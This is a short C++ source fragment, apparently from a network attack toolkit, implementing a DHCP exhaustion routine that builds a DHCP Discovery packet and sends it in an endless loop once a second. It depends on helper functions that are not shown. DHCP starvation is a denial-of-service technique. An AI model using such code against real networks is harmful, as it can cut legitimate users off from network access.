#include "DHCPExhaustion.h"

void DHCPExhaustion::run() {
    auto packet = serratia::buildDHCPDiscovery(config_);
    while(true) {
        send_dev_->sendPacket(*(packet.getRawPacket()));
        sleep(1);
    }
}